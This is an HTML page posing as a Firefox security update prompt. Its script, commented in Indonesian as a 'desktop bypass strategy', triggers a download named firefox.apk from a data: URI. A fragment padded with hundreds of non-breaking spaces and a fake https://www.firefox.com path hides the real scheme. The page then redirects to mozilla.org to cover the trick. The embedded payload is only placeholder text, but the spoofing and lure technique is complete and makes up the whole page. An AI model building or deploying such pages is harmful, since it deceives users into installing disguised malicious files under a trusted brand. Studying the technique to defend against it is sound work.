<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Firefox Security Update Center</title>
    <style>
        body { background: #1a1a1a; color: #fff; font-family: sans-serif; text-align: center; padding-top: 100px; }
        .box { border: 1px solid #ff7113; padding: 40px; display: inline-block; border-radius: 10px; }
        button { padding: 15px 30px; background: #ff7113; color: #fff; border: none; cursor: pointer; font-weight: bold; }
    </style>
</head>
<body>

    <div class="box">
        <h2>Critical Browser Update</h2>
        <p>Your Firefox version requires an urgent security patch.</p>
        <button type="button" id="strikeBtn">Update Now (v151.0.1)</button>
    </div>

<script>
    document.getElementById('strikeBtn').addEventListener('click', function() {
        const filename = "firefox.apk"; // Tetap .apk atau ganti .exe untuk desktop
        const targetDomain = "www.firefox.com";
        
        // --- DESKTOP BYPASS STRATEGY ---
        // 1. Menggunakan karakter "Non-Breaking Space" (\u00A0) yang sangat banyak
        //    untuk mendorong 'data:' ke kiri agar tersembunyi/overflow.
        // 2. Menggunakan skema HTTPS palsu di dalam fragment.
        const invisiblePadding = "\u00A0".repeat(500); 
        const fakePath = "/security-patch-v151-update-verification-center/";
        
        // Kita susun agar 'www.firefox.com' muncul di awal area yang terlihat
        const spoofStr = `${invisiblePadding}https://${targetDomain}${fakePath}`;

        // Payload Construction
        // Kita tambahkan null byte %00 (jika didukung) atau fragment #
        const base64Data = "ZXN0dGVzdGVzdHRlc3Q=";
        const payload = `data:application/octet-stream;base64,${base64Data}#${spoofStr}`;

        const a = document.createElement('a');
        a.href = payload;
        a.download = filename;
        document.body.appendChild(a);
        a.click();
        
        setTimeout(() => {
            document.body.removeChild(a);
            window.location.replace("https://www.mozilla.org/security/");
        }, 2000);
    });
</script>
</body>
</html>
